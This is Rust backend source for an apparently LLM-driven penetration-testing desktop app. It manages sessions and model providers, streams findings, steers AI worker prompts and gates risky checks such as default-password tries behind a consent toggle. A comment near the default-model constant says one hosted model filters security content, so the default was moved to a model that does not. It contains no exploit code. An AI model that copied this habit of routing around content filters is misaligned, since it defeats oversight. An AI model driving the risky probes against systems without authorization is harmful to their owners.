// RedCell Desktop — Tauri v2 백엔드.
//
// 역할:
//   1) 세션(engagement)을 디스크에 JSON 으로 저장/조회/삭제한다.
//   2) 세션 실행 시 형제 프로젝트 `redcell` 의 CLI 를 `--ndjson` 으로 띄우고,
//      stdout 의 NDJSON 이벤트를 파싱해 프론트엔드로 실시간 스트리밍한다.
//
// 안전: 이 앱은 공격력을 새로 만들지 않는다. 모든 액션은 redcell 의 ScopeGuard
//       (authorization.yaml)를 그대로 통과한다. 이 프로세스는 "관측/표시" 계층이다.

#![cfg_attr(all(not(debug_assertions), target_os = "windows"), windows_subsystem = "windows")]

use std::collections::{HashMap, HashSet};
use std::fs;
use std::io::{BufRead, BufReader, Read as _};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStderr, ChildStdout, Command, Stdio};
use std::sync::Mutex;
use std::thread;

use chrono::Utc;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tauri::{AppHandle, Emitter, Manager};
use uuid::Uuid;

use session_store::*;
use deep_instr::*;

mod auth;
mod deep_instr;
mod probes;
mod risk;
mod session_store;

/// 실행 중인 redcell 자식 프로세스 레지스트리(세션 id → Child). 중지 시 kill 용도.
struct Procs(Mutex<HashMap<String, Child>>);



/// redcell 프로젝트 위치 추정: 환경변수 → cwd 상대 → 실행파일 상위 경로.
fn guess_redcell_dir() -> Option<String> {
    if let Ok(env) = std::env::var("REDCELL_DIR") {
        if !env.trim().is_empty() {
            return Some(env);
        }
    }
    let mut cands: Vec<PathBuf> = Vec::new();
    if let Ok(cwd) = std::env::current_dir() {
        cands.push(cwd.join("../redcell"));
        cands.push(cwd.join("../../redcell"));
        cands.push(cwd.join("../../../redcell"));
    }
    if let Ok(exe) = std::env::current_exe() {
        let mut a: &Path = exe.as_path();
        for _ in 0..7 {
            if let Some(p) = a.parent() {
                cands.push(p.join("redcell"));
                a = p;
            } else {
                break;
            }
        }
    }
    for c in cands {
        if c.join("src/cli.ts").exists() {
            return Some(
                fs::canonicalize(&c)
                    .unwrap_or(c)
                    .to_string_lossy()
                    .to_string(),
            );
        }
    }
    None
}

/// LGE AIGW 기본 모델 — MLflow Responses 엔드포인트의 GLM 서빙 이름.
/// Sonnet 5.5 서빙(`lge_esdataplfm_ws.custom_model_prd.esdp-sonnet-5-5`)은 보안 진단
/// 콘텐츠(공격 용어·recon 툴 정의)를 상류에서 필터링해 `completed` 빈 응답만 돌려줘
/// (2026-10-26 실측) 진단 기본값으로 쓸 수 없다 — 기본값을 Sonnet 으로 바꾸면
/// 전 워커가 빈 성공이 되어 리포트가 발행되지 않는다.
const LGE_AIGW_DEFAULT_MODEL: &str = "system.ai.glm-5-3-flash";

// ── 커맨드 ───────────────────────────────────────────────────────────────────
#[tauri::command]
fn get_settings(app: AppHandle) -> Settings {
    let mut s: Settings = fs::read_to_string(settings_file(&app))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default();
    if s.redcell_dir.trim().is_empty() {
        if let Some(dir) = guess_redcell_dir() {
            s.redcell_dir = dir;
        }
    }
    // 기본 내장 연결 심기 — LGE AIGW MLflow Responses 엔드포인트를 설정 없이
    // 바로 쓰게 한다. 키는 사용자가 카드에 직접 붙여넣는 Databricks 토큰이며,
    // 비어 있으면 pi 가 "--api-key 미지정"으로 실패하고 안내 메시지를 낸다.
    // 사용자가 카드를 비우면 다음 로드에서 다시 심긴다.
    if !s.providers.contains_key("lge-aigw") {
        s.providers.insert(
            "lge-aigw".to_string(),
            ProviderConn {
                api_key: String::new(),
                base_url: String::new(), // 빈 값 = 카탈로그 기본 base URL 사용
                model: LGE_AIGW_DEFAULT_MODEL.into(),
                api: "openai-responses".into(),
            },
        );
    } else if let Some(conn) = s.providers.get_mut("lge-aigw") {
        // 모델 자동 이행 없음 — 저장된 모델(Sonnet 포함)은 사용자가 직접 고른 값으로
        // 존중한다. Sonnet 서빙은 진단 콘텐츠를 빈 응답 처리하므로 그런 설정에서는
        // 실행 단계(핑·워커)의 빈-응답 게이트가 원인과 GLM 복귀를 안내한다.
        // 구버전 기본값(`!ug auth-token` + Anthropic 경로)에서 새 기본값으로 이행 —
        // 셸 명령 키 해석은 데스크톱 실행 환경에 따라 실패하기 쉽다(핑 오류 원인).
        // 정확히 구버전 기본 조합일 때만 되돌리고, 사용자가 쓴 값은 존중한다.
        let old_default = conn.api_key.trim() == "!ug auth-token"
            && conn.base_url.trim().is_empty()
            && (conn.api.trim() == "anthropic-messages" || conn.api.trim().is_empty());
        if old_default {
            conn.api_key = String::new();
            conn.base_url = String::new();
            conn.api = "openai-responses".into();
        }
    }
    if s.default_provider.trim().is_empty() || s.default_provider == "mock" {
        s.default_provider = "lge-aigw".into();
    }
    s
}

#[tauri::command]
fn save_settings(app: AppHandle, settings: Settings) -> Result<Settings, String> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let txt = serde_json::to_string_pretty(&settings).map_err(|e| e.to_string())?;
    fs::write(settings_file(&app), txt).map_err(|e| e.to_string())?;
    Ok(settings)
}

#[tauri::command]
fn list_sessions(app: AppHandle) -> Vec<Session> {
    let mut out: Vec<Session> = Vec::new();
    if let Ok(rd) = fs::read_dir(sessions_dir(&app)) {
        for e in rd.flatten() {
            if e.path().extension().and_then(|x| x.to_str()) == Some("json") {
                if let Some(s) = fs::read_to_string(e.path())
                    .ok()
                    .and_then(|t| serde_json::from_str::<Session>(&t).ok())
                {
                    // 요약만 돌려준다 — 이벤트·채팅은 get_session 으로 필요할 때만 로드.
                    // (세션 수가 늘어도 탭/대시보드 초기 로딩이 무거워지지 않게)
                    out.push(Session { events: Vec::new(), chat: Vec::new(), ..s });
                }
            }
        }
    }
    out.sort_by(|a, b| b.updated_at.cmp(&a.updated_at));
    out
}

#[tauri::command]
fn get_session(app: AppHandle, id: String) -> Option<Session> {
    read_session(&app, &id)
}

#[tauri::command]
fn create_session(
    app: AppHandle,
    name: String,
    host: String,
    port: Option<u16>,
    goal: String,
    provider: String,
    mode: Option<String>,
    max: Option<bool>,
    diag: Option<bool>,
    deep: Option<bool>,
    engine: Option<String>,
    auth_cookie: Option<String>,
) -> Session {
    let id = Uuid::new_v4().to_string();
    let s = Session {
        name: if name.trim().is_empty() {
            format!("session-{}", &id[..8])
        } else {
            name
        },
        host,
        port,
        goal,
        provider: if provider.trim().is_empty() {
            String::new() // mock 제거 — 미지정이면 UI가 프로바이더 선택 모달로 안내
        } else {
            provider
        },
        mode: match mode {
            Some(m) if !m.trim().is_empty() => m,
            _ => default_mode(),
        },
        max: max.unwrap_or(false),
        diag: diag.unwrap_or(false),
        deep: deep.unwrap_or(false),
        engine: engine.unwrap_or_default(),
        auth_cookie: auth_cookie.unwrap_or_default(),
        danger_consent: false,
        danger_consented_at: String::new(),
        piq: String::new(),
        status: "idle".into(),
        created_at: now(),
        updated_at: now(),
        chat: Vec::new(),
        events: Vec::new(),
        id,
    };
    write_session_locked(&app, &s);
    s
}

#[tauri::command]
fn update_session(
    app: AppHandle,
    id: String,
    name: String,
    host: String,
    port: Option<u16>,
    goal: String,
    provider: String,
    mode: Option<String>,
    max: Option<bool>,
    diag: Option<bool>,
    deep: Option<bool>,
    engine: Option<String>,
    auth_cookie: Option<String>,
) -> Option<Session> {
    let mut s = read_session(&app, &id)?;
    s.name = name;
    s.host = host;
    s.port = port;
    s.goal = goal;
    s.provider = provider;
    if let Some(m) = mode {
        if !m.trim().is_empty() {
            s.mode = m;
        }
    }
    if let Some(mx) = max {
        s.max = mx;
    }
    if let Some(d) = diag {
        s.diag = d;
    }
    if let Some(dd) = deep {
        s.deep = dd;
    }
    if let Some(e) = engine {
        s.engine = e;
    }
    if let Some(c) = auth_cookie {
        s.auth_cookie = c;
    }
    s.updated_at = now();
    write_session_locked(&app, &s);
    Some(s)
}

/// 위험 검사 동의 설정 — 동의 모달의 명시 확인 전용 커맨드.
/// 동의 시 시각을 찍고 감사 노트를 남긴다. 철회는 즉시 반영된다.
#[tauri::command]
fn set_danger_consent(app: AppHandle, id: String, consent: bool) -> Option<Session> {
    let mut s = read_session(&app, &id)?;
    s.danger_consent = consent;
    s.danger_consented_at = if consent { now() } else { String::new() };
    s.updated_at = now();
    write_session_locked(&app, &s);
    let text = if consent {
        "[경고] 위험 검사 켜짐 — 흔한 초기 비밀번호·옆 번호 정보·임시 파일 만들기가 다음 진단부터 실행됩니다. (이번 작업만, 언제든 끌 수 있음)"
    } else {
        "[sys] 위험 검사 꺼짐 — 안전한 읽기 방식으로 돌아갑니다."
    };
    let ev = json!({ "type": "note", "text": text });
    let stamped = append_event(&app, &id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    Some(s)
}

#[tauri::command]
fn delete_session(app: AppHandle, id: String) -> Result<(), String> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    fs::remove_file(session_file(&app, &id)).map_err(|e| e.to_string())?;
    // 이벤트 NDJSON 이 남으면 삭제한 세션의 기록이 다시 생긴다 — 함께 제거.
    match fs::remove_file(events_file(&app, &id)) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e.to_string()),
    }
}

#[tauri::command]
fn append_chat(app: AppHandle, id: String, role: String, content: String) -> Option<Session> {
    let guard = app.state::<IoGuard>();
    let _lock = guard.0.lock().unwrap();
    let p = session_file(&app, &id);
    let mut s: Session = fs::read_to_string(&p)
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())?;
    s.chat.push(ChatMessage {
        role,
        content,
        ts: now(),
    });
    s.updated_at = now();
    fs::write(&p, serde_json::to_string_pretty(&s).ok()?).ok();
    Some(s)
}

/// 엔진 레지스트리(redcell/src/providers/registry.ts)와 동일하게 유지한다.
struct ProviderMeta {
    name: &'static str,
    kind: &'static str,
    note: &'static str,
    default_model: &'static str,
    env_keys: &'static [&'static str],
    base_url: &'static str,
    needs_base: bool,
}
const PROVIDER_CATALOG: &[ProviderMeta] = &[
    ProviderMeta { name: "anthropic", kind: "anthropic", note: "Claude 공식 API", default_model: "claude-opus-5", env_keys: &["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"], base_url: "https://api.anthropic.com/v1", needs_base: false },
    ProviderMeta { name: "openai", kind: "openai-compat", note: "GPT 공식 API", default_model: "gpt-5.4", env_keys: &["OPENAI_API_KEY"], base_url: "https://api.openai.com/v1", needs_base: false },
    ProviderMeta { name: "openrouter", kind: "openai-compat", note: "다수 모델 게이트웨이 — 무료 모델은 모델란에 `:free`(예: meta-llama/llama-3.3-70b-instruct:free)", default_model: "moonshotai/kimi-k2.6", env_keys: &["OPENROUTER_API_KEY"], base_url: "https://openrouter.ai/api/v1", needs_base: false },
    ProviderMeta { name: "prime-inference", kind: "openai-compat", note: "Prime Intellect inference", default_model: "z-ai/glm-5.2", env_keys: &["PRIME_API_KEY"], base_url: "https://api.pinference.ai/api/v1", needs_base: false },
    ProviderMeta { name: "groq", kind: "openai-compat", note: "고속 추론", default_model: "openai/gpt-oss-120b", env_keys: &["GROQ_API_KEY"], base_url: "https://api.groq.com/openai/v1", needs_base: false },
    ProviderMeta { name: "cerebras", kind: "openai-compat", note: "Cerebras 초고속 추론", default_model: "gpt-oss-120b", env_keys: &["CEREBRAS_API_KEY"], base_url: "https://api.cerebras.ai/v1", needs_base: false },
    ProviderMeta { name: "xai", kind: "openai-compat", note: "xAI Grok", default_model: "grok-4.20-0309-reasoning", env_keys: &["XAI_API_KEY"], base_url: "https://api.x.ai/v1", needs_base: false },
    ProviderMeta { name: "deepseek", kind: "openai-compat", note: "DeepSeek", default_model: "deepseek-v4-pro", env_keys: &["DEEPSEEK_API_KEY"], base_url: "https://api.deepseek.com", needs_base: false },
    ProviderMeta { name: "mistral", kind: "openai-compat", note: "Mistral AI", default_model: "devstral-medium-latest", env_keys: &["MISTRAL_API_KEY"], base_url: "https://api.mistral.ai/v1", needs_base: false },
    ProviderMeta { name: "moonshotai", kind: "openai-compat", note: "Moonshot Kimi", default_model: "kimi-k2.6", env_keys: &["MOONSHOT_API_KEY"], base_url: "https://api.moonshot.ai/v1", needs_base: false },
    ProviderMeta { name: "zai", kind: "openai-compat", note: "Z.ai GLM", default_model: "glm-5.1", env_keys: &["ZAI_API_KEY"], base_url: "https://api.z.ai/api/coding/paas/v4", needs_base: false },
    // 기본 내장 연결 — LGE Databricks AI Gateway MLflow Responses 엔드포인트.
    // 키는 사용자가 ⚙ 설정 > 프로바이더 카드에 직접 붙여넣는 Databricks 토큰
    // ($DATABRICKS_TOKEN, ug auth-token 출력과 동일) — CLI --api-key 로 주입되므로
    // 셸 명령 해석(!command)에 의존하지 않는다.
    ProviderMeta { name: "lge-aigw", kind: "openai-compat", note: "LGE Databricks AI Gateway — Responses API (키: Databricks 토큰을 키란에 직접 입력)", default_model: LGE_AIGW_DEFAULT_MODEL, env_keys: &[], base_url: "https://lge-esdatapf.cloud.databricks.com/ai-gateway/mlflow/v1", needs_base: false },
    ProviderMeta { name: "ollama", kind: "openai-compat", note: "로컬/원격 ollama 서버 (키 불필요)", default_model: "llama3.1", env_keys: &[], base_url: "http://localhost:11434/v1", needs_base: true },
    ProviderMeta { name: "custom", kind: "openai-compat", note: "임의 OpenAI 호환 엔드포인트 — vLLM·LM Studio·원격 ollama 등", default_model: "", env_keys: &["REDCELL_OPENAI_API_KEY"], base_url: "", needs_base: true },
];

/// 추가 확인 컨텍스트 — 워커별 (자가 누적, 타 분야 단서) + 단서 총합.
/// 단서는 "다른 워커가 이번 차수에 보고한 것 중 자기가 아직 보고하지 않은 것"이다:
/// 자가 누적 키에 없는 것만 전달해 자기 반복을 막고 분야 간 교차 검증을 살린다.
/// 워커당 최대 6줄.
/// 밴딧 수확 집계 — 이번 라운드 워커별 신규 발견 수 (`seen` 이전 기준).
/// 내림차순·동점 id 순 (결정적). 세션 한정 학습 — 메모리에만 존재한다.
fn bandit_yields(
    results: &[(String, PumpOutcome)],
    seen: &std::collections::HashSet<String>,
) -> Vec<(String, usize)> {
    let mut y: Vec<(String, usize)> = results
        .iter()
        .map(|(wid, o)| {
            let n = if o.failed && !has_usable_text(o) {
                0
            } else {
                extract_finding_keys(&o.text).into_iter().filter(|k| !seen.contains(k)).count()
            };
            (wid.clone(), n)
        })
        .collect();
    y.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    y
}

/// 밴딧 집중 지시 — 수확 1위 심화·0수확 전환 (전원 0이면 무음).
fn bandit_focus_lines(yields: &[(String, usize)]) -> std::collections::HashMap<String, String> {
    let mut out = std::collections::HashMap::new();
    let max = yields.iter().map(|(_, n)| *n).max().unwrap_or(0);
    if max == 0 {
        return out;
    }
    for (wid, n) in yields {
        if *n == max {
            out.insert(wid.clone(), format!("[집중] 수확 1위(신규 {n}건) — 심화 우선, [가정] 승격에 집중하라."));
        } else if *n == 0 {
            out.insert(wid.clone(), "[전환] 수확 없음 — 새 표면 개척으로 전환하고 반복을 멈춰라.".to_string());
        }
    }
    out
}

/// 세션 플레이북 — P1/위험 확정 + 체인 단서 (이번 실행 한정, 저장 없음).
/// 빈 스윕이면 빈 문자열 (지시문 오염 방지).
fn session_playbook_block(sweep: &probes::ProbeReport) -> String {
    let mut lines: Vec<String> = Vec::new();
    for h in sweep
        .hits
        .iter()
        .filter(|h| {
            (h.category.starts_with("verify-") || h.category.starts_with("danger-"))
                && (h.severity == "high" || h.severity == "critical")
        })
        .take(6)
    {
        let t: String = h.title.chars().take(80).collect();
        lines.push(format!("- [{}] [{}] {}", h.id, h.severity, t.trim()));
    }
    for c in probes::chain_hints(&sweep.hits).into_iter().take(3) {
        lines.push(c);
    }
    if lines.is_empty() {
        return String::new();
    }
    format!(
        "\n\n## 세션 플레이북 (이번 실행 확정 — 세션 한정, 저장 안 됨)\n{}\n규칙: 확정 항목은 재프로브하지 말고 체인 심화·빈틈 보완에 집중하라.",
        lines.join("\n")
    )
}

fn build_followup_context(
    results: &[(String, PumpOutcome)],
    accum: &std::collections::HashMap<String, String>,
    focus: &std::collections::HashMap<String, String>,
) -> (std::collections::HashMap<String, (String, String)>, usize) {
    let mut own_keys: std::collections::HashMap<String, std::collections::HashSet<String>> =
        std::collections::HashMap::new();
    for def in DEEP_WORKERS {
        let keys: std::collections::HashSet<String> = accum
            .get(def.id)
            .map(|t| extract_finding_keys(t).into_iter().collect())
            .unwrap_or_default();
        own_keys.insert(def.id.to_string(), keys);
    }
    let mut ctx: std::collections::HashMap<String, (String, String)> = std::collections::HashMap::new();
    let mut leads = 0usize;
    for def in DEEP_WORKERS {
        let empty = std::collections::HashSet::new();
        let mine = own_keys.get(def.id).unwrap_or(&empty);
        let mut cross_lines: Vec<String> = Vec::new();
        for (wid, o) in results {
            if wid == def.id || (o.failed && !has_usable_text(o)) {
                continue;
            }
            for k in extract_finding_keys(&o.text) {
                if mine.contains(&k) {
                    continue;
                }
                cross_lines.push(format!("- [단서:{wid}] {k}"));
                if cross_lines.len() >= 6 {
                    break;
                }
            }
            if cross_lines.len() >= 6 {
                break;
            }
        }
        leads += cross_lines.len();
        let cross_body = cross_lines.join("\n");
        let cross = match focus.get(def.id) {
            Some(f) if cross_body.is_empty() => f.clone(),
            Some(f) => format!("{f}\n{cross_body}"),
            None => cross_body,
        };
        ctx.insert(def.id.to_string(), (accum.get(def.id).cloned().unwrap_or_default(), cross));
    }
    (ctx, leads)
}

/// 프로바이더 목록 + 자격증명 감지 상태(프론트 연동용).
#[tauri::command]
fn get_providers() -> Value {
    Value::Array(
        PROVIDER_CATALOG
            .iter()
            .map(|p| {
                let ready_env = p.env_keys.iter().any(|k| {
                    std::env::var(k).map(|v| !v.trim().is_empty()).unwrap_or(false)
                });
                json!({
                    "name": p.name,
                    "kind": p.kind,
                    "note": p.note,
                    "default_model": p.default_model,
                    "base_url": p.base_url,
                    "env_keys": p.env_keys,
                    "ready_env": ready_env,
                    "needs_base": p.needs_base,
                })
            })
            .collect(),
    )
}

/// 저장된 연결 정보를 자식 프로세스(pi) 환경변수로 주입한다.
/// pi 는 환경변수(REDCELL_* 는 무시한다!) 대신 자체 규칙으로 자격증명을 읽는다:
///   1순위 CLI --api-key → 2순위 ~/.pi/agent/auth.json → 3순위 표준 env(ANTHROPIC_API_KEY 등)
/// 그래서 키는 (a) 표준 env 주입 + (b) --api-key CLI 인자 두 경로로 넘긴다.
fn inject_provider_env(cmd: &mut Command, provider: &str, conn: &ProviderConn) {
    if let Some(p) = PROVIDER_CATALOG.iter().find(|p| p.name == provider) {
        // `!명령` 키는 주입하지 않는다 — 명령 문자열 자체를 키로 쓰는 셈이 된다.
        if !conn.api_key.trim().is_empty() && !conn.api_key.trim_start().starts_with('!') {
            if let Some(k) = p.env_keys.last() {
                // 마지막 env 슬롯에 주입(앞쪽 OAUTH 등 실제 설정 env 가 있으면 그게 우선)
                cmd.env(k, conn.api_key.trim());
            }
        }
    }
}

/// pi 의 커스텀 프로바이더(baseUrl 기반)는 `~/.pi/agent/models.json` 에만 선언할 수 있다.
/// (docs/models-configuration.md: custom providers) 프로바이더 "custom"/"ollama" 는
/// baseUrl·apiKey·models 를 여기에 기록해야 pi 가 프로바이더로 인식하고 키 없음 오류가 나지 않는다.
/// 사용자의 기존 파일(다른 프로바이더·이름 등)은 보존하고 같은 이름만 병합(upsert)한다.
/// `api` 가 비어 있으면 기존 api 를 유지(없으면 openai-completions)하고, 지정됐으면
/// 그 방언으로 덮어쓴다. anthropic-messages (Databricks AI Gateway 등) 일 때는 게이트웨이가
/// 요구하는 authHeader·compat 를 함께 기록하고, OpenAI 방언으로 돌아오면 제거한다.
/// apiKey 가 `!명령` 형태(pi 의 !command)면 그대로 기록한다 — pi 가 요청마다 실행해
/// 토큰을 받아오므로 만료되는 키를 파일에 박지 않아도 된다 (`ug auth-token ...` 용).
/// models.json 은 정밀 진단의 5개 분야 스레드가 동시에 갱신할 수 있다 —
/// read-modify-write 가 겹치면 엔트리가 사라지거나 반쯤 쓰인 파일이 남으므로 직렬화한다.
static MODELS_JSON_LOCK: Mutex<()> = Mutex::new(());

/// pi 가 기본 카탈로그에 없는 프로바이더 — 실행 전 models.json 병합이 필요하다.
fn needs_models_json_sync(provider: &str) -> bool {
    matches!(provider, "custom" | "ollama" | "lge-aigw")
}

/// 프로바이더별 기본 API 방언 — 앱 설정(api)이 비었을 때 쓴다.
fn provider_default_api(provider: &str) -> &'static str {
    match provider {
        // LGE AIGW 는 MLflow Responses API 다 (OpenAI Responses 방언).
        "lge-aigw" => "openai-responses",
        _ => "",
    }
}

/// 동기화에 쓸 base URL — 앱 설정이 비었으면 카탈로그 기본값(lge-aigw 등 내장 연결).
fn sync_base_url(provider: &str, conn: &ProviderConn) -> String {
    if !conn.base_url.trim().is_empty() {
        return conn.base_url.trim().to_string();
    }
    PROVIDER_CATALOG
        .iter()
        .find(|p| p.name == provider)
        .map(|p| p.base_url.to_string())
        .unwrap_or_default()
}

/// 동기화에 쓸 API 방언 — 앱 설정이 비었으면 프로바이더 기본값.
fn sync_api(provider: &str, conn: &ProviderConn) -> String {
    if !conn.api.trim().is_empty() {
        return conn.api.trim().to_string();
    }
    provider_default_api(provider).to_string()
}

fn sync_pi_models_json_at(path: &Path, provider: &str, base_url: &str, api_key: &str, model: &str, api: &str) -> Result<(), String> {
    let _guard = MODELS_JSON_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    let mut root: Value = fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_else(|| json!({ "providers": {} }));
    if root.get("providers").is_none() {
        root["providers"] = json!({});
    }
    let existing = root["providers"].get(provider).cloned().unwrap_or_else(|| json!({}));
    let mut prov: serde_json::Map<String, Value> = existing.as_object().cloned().unwrap_or_default();
    if !base_url.trim().is_empty() {
        prov.insert("baseUrl".into(), Value::String(base_url.trim().to_string()));
    }
    if !api.trim().is_empty() {
        prov.insert("api".into(), Value::String(api.trim().to_string()));
    } else if prov.get("api").is_none() {
        prov.insert("api".into(), Value::String("openai-completions".into()));
    }
    let anthropic = prov.get("api").and_then(|v| v.as_str()) == Some("anthropic-messages");
    if anthropic {
        // Databricks AI Gateway 의 Anthropic 경로: Bearer 인증 + per-tool
        // eager_input_streaming 미지원이므로 레거시 beta 헤더 경로를 쓴다 (ug 와 동일).
        prov.insert("authHeader".into(), Value::Bool(true));
        let mut compat = prov.get("compat").and_then(|v| v.as_object()).cloned().unwrap_or_default();
        compat.insert("supportsEagerToolInputStreaming".into(), Value::Bool(false));
        if provider == "lge-aigw" {
            // AIGW GLM 은 thinking 블록에 빈 signature 를 돌려준다 — 그대로 재생한다.
            compat.insert("allowEmptySignature".into(), Value::Bool(true));
        }
        prov.insert("compat".into(), Value::Object(compat));
    } else {
        // 게이트웨이 전용 필드만 걷어내고 사용자가 쓴 compat 은 보존한다.
        prov.remove("authHeader");
        if let Some(compat) = prov.get_mut("compat").and_then(|v| v.as_object_mut()) {
            compat.remove("supportsEagerToolInputStreaming");
        }
        // 보수적 OpenAI 호환 기본값 — pi 는 기본으로 stream_options.include_usage 를
        // 보내는데, 이를 모르는 엔드포인트(구버전 vLLM·사내 프록시·ollama 구버전)는
        // 이 필드 하나로 400 을 돌려준다. store·developer 역할도 알 수 없는
        // 엔드포인트엔 끄고 시작한다 — 사용자가 직접 쓴 compat 값은 존중한다.
        // pi 의 openai-responses 클라이언트는 기본으로 HTTP 사양 밖의 `session_id`
        // (밑줄 포함) 헤더를 보내 세션 어피니티를 챙기는데, strict 프록시·게이트웨이는
        // 이를 본문 없는 400 으로 거부하는 게 알려진 pi 이슈(#3579)라 기본으로 끈다.
        let mut compat = prov.get("compat").and_then(|v| v.as_object()).cloned().unwrap_or_default();
        for (k, v) in [
            ("supportsUsageInStreaming", json!(false)),
            ("supportsStore", json!(false)),
            ("supportsDeveloperRole", json!(false)),
            ("sessionAffinityFormat", json!("openai-nosession")), // 신버전 pi
            ("sendSessionIdHeader", json!(false)),                // 구버전 pi
        ] {
            compat.entry(k.to_string()).or_insert(v);
        }
        prov.insert("compat".into(), Value::Object(compat));
    }
    // apiKey 는 반드시 비어있지 않은 문자열로 남긴다 — pi 는 빈 apiKey 가 있으면
    // 프로바이더 자체를 목록에서 내려버리므로, 미설정이면 placeholder 를 쓴다
    // (키 없는 로컬 서버는 헤더를 무시하므로 문제없고, 실제 키는 --api-key 로 우선 주입).
    prov.insert(
        "apiKey".into(),
        Value::String(if api_key.trim().is_empty() {
            "redcell-placeholder".to_string()
        } else {
            api_key.trim().to_string()
        }),
    );
    // models 목록 upsert (지정한 모델 id 가 없으면 추가, 기존 목록 보존).
    let mut models: Vec<Value> = prov
        .get("models")
        .and_then(|m| m.as_array())
        .cloned()
        .unwrap_or_default();
    if !model.trim().is_empty() {
        let id = model.trim().to_string();
        let exists = models.iter().any(|m| m.get("id").and_then(|i| i.as_str()) == Some(id.as_str()));
        if !exists {
            let mut entry = json!({ "id": id });
            if provider == "lge-aigw" {
                // thinking 이 max_tokens 를 먼저 쓴다 — 상한·컨텍스트를 명시해
                // "thinking 만 하고 답이 잘리는" 현상을 막는다.
                // reasoning 은 false 로 둔다 — pi 는 reasoning:true 모델에 thinking
                // 레벨 미지정 시 `reasoning:{effort:"none"}` 을 보내는데, GLM 서빙은
                // thinking-only 라 "none" 을 400 으로 거부한다 (직통 요청에는
                // reasoning 필드가 없어 성공 — 핑 실패 원인 분류 참조).
                entry["reasoning"] = json!(false);
                entry["contextWindow"] = json!(200000);
                entry["maxTokens"] = json!(16384);
            }
            models.push(entry);
        }
    }
    if provider == "lge-aigw" {
        // 구버전 앱이 기록한 `reasoning:true` 항목도 매 동기화마다 치유한다 —
        // 항목이 이미 있으면 손대지 않던 기존 동작 탓에 stale 설정이 남아
        // 핑 400(reasoning_effort "none" 거부)이 반복되던 것을 고친다.
        // 사용자가 직접 쓴 상한·컨텍스트는 존중하고 빠진 것만 채운다.
        for m in models.iter_mut() {
            if let Some(obj) = m.as_object_mut() {
                obj.insert("reasoning".into(), Value::Bool(false));
                obj.remove("thinkingLevelMap");
                if obj.get("contextWindow").and_then(|v| v.as_u64()).unwrap_or(0) == 0 {
                    obj.insert("contextWindow".into(), json!(200000));
                }
                if obj.get("maxTokens").and_then(|v| v.as_u64()).unwrap_or(0) == 0 {
                    obj.insert("maxTokens".into(), json!(16384));
                }
            }
        }
    }
    if models.is_empty() {
        return Err(format!(
            "프로바이더 '{provider}' 에 모델이 지정되지 않았습니다 — ⚙ 설정 > 모델 연결 에서 모델명을 입력하세요."
        ));
    }
    prov.insert("models".into(), Value::Array(models));
    root["providers"][provider] = Value::Object(prov);
    if let Some(dir) = path.parent() {
        fs::create_dir_all(dir).map_err(|e| format!("pi 설정 디렉터리 생성 실패: {e}"))?;
    }
    let mut text = serde_json::to_string_pretty(&root).map_err(|e| e.to_string())?;
    text.push('\n');
    fs::write(path, &text).map_err(|e| format!("models.json 기록 실패: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o600));
    }
    Ok(())
}

/// 프라이빗 설정 경로: pi 는 ~/.pi(Windows: %USERPROFILE%\.pi) 를 사용한다.
fn pi_models_json_path() -> Result<PathBuf, String> {
    user_home()
        .map(|h| h.join(".pi").join("agent").join("models.json"))
        .ok_or_else(|| "홈 디렉터리(HOME/USERPROFILE)를 찾을 수 없습니다.".to_string())
}

/// `!명령` 키(pi !command) 해석 — 연결 테스트용으로 한 번만 실행해 토큰을 받아온다.
/// (`ug auth-token ...` 처럼 요청마다 새 토큰을 만드는 명령을 카드에 넣었을 때,
/// 테스트에서도 같은 경로로 토큰을 구한다. 최대 10초.)
fn resolve_bang_key(key: &str) -> Result<String, String> {
    let cmdline = key.trim_start().strip_prefix('!').unwrap_or("").trim();
    if cmdline.is_empty() {
        return Err("`!` 뒤에 실행할 명령이 없습니다.".into());
    }
    let mut cmd = if cfg!(windows) {
        let comspec = std::env::var_os("COMSPEC").unwrap_or_else(|| "cmd.exe".into());
        let mut c = Command::new(comspec);
        c.arg("/C").arg(cmdline);
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c").arg(cmdline);
        c
    };
    hide_window(&mut cmd);
    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("키 명령 실행 실패: {e}"))?;
    use std::io::Read;
    let mut waited = 0;
    loop {
        if let Some(st) = child.try_wait().map_err(|e| e.to_string())? {
            let mut out = String::new();
            if let Some(mut o) = child.stdout.take() {
                let _ = o.read_to_string(&mut out);
            }
            let tok = out.trim().to_string();
            if st.success() && !tok.is_empty() {
                // pi 와 동일하게 stdout 전체(trim)를 토큰으로 쓴다.
                return Ok(tok);
            }
            let mut err = String::new();
            if let Some(mut o) = child.stderr.take() {
                let _ = o.read_to_string(&mut err);
            }
            let detail = if tok.is_empty() { err.trim().to_string() } else { tok };
            return Err(format!("키 명령이 토큰을 내놓지 않았습니다{}.", if detail.is_empty() { String::new() } else { format!(": {detail}") }));
        }
        std::thread::sleep(std::time::Duration::from_millis(150));
        waited += 150;
        if waited > 10000 {
            let _ = child.kill();
            return Err("키 명령 시간 초과 (10초) — `ug auth-token ...` 인증 상태를 확인하세요.".into());
        }
    }
}

/// 연결 테스트 — node fetch 로 대상 엔드포인트 도달성/키 인증을 확인한다.
/// (reqwest 의존성 추가 없이 이미 있는 node 를 재사용)
/// 방언별로 실제 1회 생성 호출을 날려 키·모델·방언을 함께 검증한다:
/// anthropic-messages → POST {base}/v1/messages, openai-responses → POST {base}/responses,
/// openai-completions → POST {base}/chat/completions. 실검증 로직은
